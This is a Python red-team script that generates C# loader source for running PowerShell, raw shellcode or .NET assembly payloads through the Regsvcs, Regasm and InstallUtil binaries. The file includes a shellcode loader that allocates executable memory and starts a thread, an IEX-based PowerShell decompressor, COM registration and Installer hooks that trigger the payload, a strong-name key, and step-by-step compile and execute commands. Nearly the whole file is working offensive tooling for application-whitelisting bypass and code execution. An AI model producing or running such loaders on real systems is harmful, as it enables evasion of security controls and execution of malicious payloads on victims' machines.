#!/usr/bin/python3
#
# Red-Teaming script that constructs C# code for Regsvcs/Regasm/InstallUtil code execution technique.
#
# Step 1: Generate source code file
#        cmd> python3 generateRogueDotNet.py -r payload.bin > program.cs
#
# Step 2: Compilate library .NET Assembly
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
# 
#   if you passed Powershell code to be launched in a .NET Runspace, then an additional assembly will have to be used
#   to compile resulting source code properly - meaning System.Management.Automation.dll (provided with this script).
#   Then proper compilation command will be:
#
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.Management.Automation.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs
#
# Step 3: Code execution via Regsvcs, Regasm or InstallUtil:
#   x86:
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U rogue.dll 
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#   x64:
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U rogue.dll 
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U rogue.dll

#        cmd> %WINDIR%\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#        cmd> %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
#
# Mariusz B. / mgeeky, <mb@binary-offensive.com>
#

import re
import os
import io
import sys
import gzip
import base64
import string
import struct
import random
import binascii
import argparse


def getCompressedPayload(filePath):
    out = io.BytesIO()
    encoded = ''
    with open(filePath, 'rb') as f:
        inp = f.read()

        with gzip.GzipFile(fileobj = out, mode = 'w') as fo:
            fo.write(inp)

        encoded = base64.b64encode(out.getvalue())

    powershell = "$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('{}')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();".format(
        encoded.decode()
    )
    return powershell

def getSourceFileContents(payload, _format):
    launchCode = ''
    usings = ''

    if _format == 'exe':

        exeLaunchCode = string.Template('''
        public static void Execute() {

            string payload = "$payload2";
            byte[] decoded = System.Convert.FromBase64String(payload);

            Assembly asm = Assembly.Load(decoded);
            MethodInfo method = asm.EntryPoint;
            object instance = asm.CreateInstance(method.Name);
            method.Invoke(instance, null); 

        }''').safe_substitute(
            payload2 = base64.b64encode(payload.encode()).decode()
        )


        launchCode = exeLaunchCode

    elif _format == 'raw':

        foo = str(binascii.hexlify(payload), 'ascii')
        fooarr = ['0x{}'.format(foo[i:i+2]) for i in range(0, len(foo), 2)]
        encodedPayload = '                '

        for i in range(len(fooarr)):
            if i % 16 == 0 and i > 0:
                encodedPayload += '\n                '
            encodedPayload += '{}, '.format(fooarr[i])

        encodedPayload = encodedPayload.strip()[:-1]

        shellcodeLoader = string.Template('''
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, UIntPtr dwSize, 
            UInt32 flAllocationType, 
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern bool VirtualFree(
            IntPtr lpAddress, 
            UInt32 dwSize, 
            UInt32 dwFreeType
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread( 
            UInt32 lpThreadAttributes, 
            UInt32 dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr param, 
            UInt32 dwCreationFlags, 
            ref UInt32 lpThreadId 
        );

        [DllImport("kernel32")]
        private static extern bool CloseHandle(
            IntPtr hHandle
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject( 
            IntPtr hHandle, 
            UInt32 dwMilliseconds 
        );

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 MEM_RELEASE = 0x8000;

        public static void Execute() {

            byte[] payload = new byte[$payloadSize] {
                $payload2
            };

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(payload, 0, funcAddr, payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            CloseHandle(hThread);
            VirtualFree(funcAddr, 0, MEM_RELEASE);

        }''').safe_substitute(
        payload2 = encodedPayload,
        payloadSize = len(payload)
    )

        launchCode = shellcodeLoader

    else:
        usings += '''
using System.Management.Automation;
using System.Management.Automation.Runspaces;
'''
        powershellLaunchCode = string.Template('''
        public static void Execute() {

            byte[] payload = System.Convert.FromBase64String("$payload2");
            string decoded = System.Text.Encoding.UTF8.GetString(payload);

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(decoded);
            pipeline.Invoke();

            runspace.Close();
        }''').safe_substitute(
            payload2 = base64.b64encode(payload.encode()).decode()
        )

        launchCode = powershellLaunchCode


    template = string.Template('''
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.EnterpriseServices;
$usings

/*
    Author: Casey Smith, Twitter: @subTee
    Customized by: Mariusz B. / mgeeky, <mb@binary-offensive.com>
    License: BSD 3-Clause

    Step 1: Create Your Strong Name Key -> key.snk

        $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
        $Content = [System.Convert]::FromBase64String($key)
        Set-Content key.snk -Value $Content -Encoding Byte

    Step 2: Compile source code:
        C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /target:library /out:rogue.dll /keyfile:key.snk program.cs

    Step 3: Execute your payload!
        C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
        C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
        C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 
        C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll
*/

namespace Program
{
    public class Bypass : ServicedComponent
    {
        public Bypass() 
        { 
        }
        
        // This executes if registration is successful
        [ComRegisterFunction]
        public static void RegisterClass( string key )
        {
            Shellcode.Execute();
        }
        
        // This executes if registration fails
        [ComUnregisterFunction]
        public static void UnRegisterClass( string key )
        {
            Shellcode.Execute();
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class ForInstallUtil : System.Configuration.Install.Installer
    {
        // This executes during InstallUtil /U invocation
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Shellcode.Execute();
        }
    }
    
    public class Shellcode
    {
        $launchCode           
    }
}''').safe_substitute(
        launchCode = launchCode,
        usings = usings
    )

    return template

def detectFileIsExe(filePath, forced = False):
    first1000 = []

    with open(filePath, 'rb') as f:
        first1000 = f.read()[:1000]

    if not (first1000[0] == 'M' and first1000[1] == 'Z'):
        return False

    elfanew = struct.unpack('<H', first1000[0x3c:0x3c + 2])[0]

    if not (first1000[elfanew + 0] == 'P' and first1000[elfanew + 1] == 'E'):
        return False

    dosStub = "This program cannot be run in DOS mode."
    printables = ''.join([x for x in first1000[0x40:] if x in string.printable])

    #if not dosStub in printables:
    #    return False
    return True


def opts(argv):
    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <inputFile>')
    parser.add_argument('inputFile', help = 'Input file to be embeded within C# code. May be either Powershell script, raw binary Shellcode or .NET Assembly (PE/EXE) file.')
    parser.add_argument('-e', '--exe', action='store_true', help = 'Specified input file is an Mono/.Net assembly PE/EXE. WARNING: Launching EXE is currently possible ONLY WITH MONO/.NET assembly EXE/DLL files, not an ordinary native PE/EXE!')
    parser.add_argument('-r', '--raw', action='store_true', help = 'Specified input file is a raw Shellcode to be injected in self process in a separate Thread.')

    args = parser.parse_args()

    if args.exe and args.raw:
        sys.stderr.write('[!] --exe and --raw options are mutually exclusive!\n')
        sys.exit(-1)

    return args

def main(argv):
    sys.stderr.write('''
        :: Rogue .NET Source Code Generation Utility
        To be used during Red-Team assignments to launch Powershell/Shellcode payloads via Regsvcs/Regasm/InstallUtil.
        Mariusz B. / mgeeky, <mb@binary-offensive.com>

''')
    if len(argv) < 2:
        print('Usage: ./generateRogueDotNet.py <inputFile>')
        sys.exit(-1)

    args = opts(argv)

    _format = 'powershell'

    if args.exe:
        if not detectFileIsExe(args.inputFile, args.exe):
            sys.stderr.write('[-] File not recognized as PE/EXE.\n\n')
            return False

        _format = 'exe'
        sys.stderr.write('[+] File recognized as PE/EXE.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()

    elif args.raw:
        _format = 'raw'
        sys.stderr.write('[+] File specified as raw Shellcode.\n\n')
        with open(args.inputFile, 'rb') as f:
            payload = f.read()

    else:
        sys.stderr.write('[+] Powershell code given.\n')

        if args.inputFile.endswith('.exe'):
            return False
            
        payload = getCompressedPayload(args.inputFile)

    output = getSourceFileContents(payload, _format)

    print(output)

    management = ''
    if _format == 'powershell':
        management = ' /r:System.Management.Automation.dll'

    commands = '''

=====================================

Step 1: Create Your Strong Name Key -> key.snk

    $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
    $Content = [System.Convert]::FromBase64String($key)
    Set-Content key.snk -Value $Content -Encoding Byte

Step 2: Compile source code:
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll{} /target:library /out:rogue.dll /keyfile:key.snk program.cs

Step 3: Execute your payload!
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe rogue.dll
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U rogue.dll

    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe rogue.dll 
    %WINDIR%\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U rogue.dll 

    %WINDIR%\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
    %WINDIR%\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /logtoconsole=false /U rogue.dll
    '''.format(management)

    if 'PROGRAMFILES(X86)' in os.environ:
        commands = commands.replace('Framework', 'Framework64')

    sys.stderr.write(commands)

if __name__ == '__main__':
    main(sys.argv)
